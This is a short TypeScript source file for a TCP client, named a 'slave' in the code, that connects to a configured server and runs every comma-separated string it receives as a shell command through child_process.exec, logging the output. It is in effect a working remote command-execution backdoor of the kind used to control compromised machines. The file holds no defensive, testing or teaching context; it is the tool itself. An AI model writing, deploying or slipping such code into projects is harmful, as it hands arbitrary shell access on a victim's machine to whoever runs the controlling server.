import * as net from "net";
import { exec } from 'child_process';
const ip = "127.0.0.1" // ip of tcp server
const port = 420 // slave port

let slave = new net.Socket();

slave.connect(port, ip, function() {
    console.log("[Client] Connected to TCP Server");
});

slave.on("data", function(data: String) {
    const parsed = data.toString().split(",");
    let i: number;
    for (i = 0; i < parsed.length; i++) {
        console.log("[Client][executing]: " + parsed[i]);
        const proc = exec(parsed[i].toString(), (err, stdout, stderr) => {
            if (err) {
                console.log(`[Client][executing] caused an error: ${err}`)
                return;
            }
            console.log(`[Client][output]: ${stdout}`);
        });
    }
});

slave.on("error", function(err: any) {
    console.log(`caused an error: ${err}`);
})

slave.on("close", function() {
    console.log("[Client] Data received, destroying TCP client..");
})
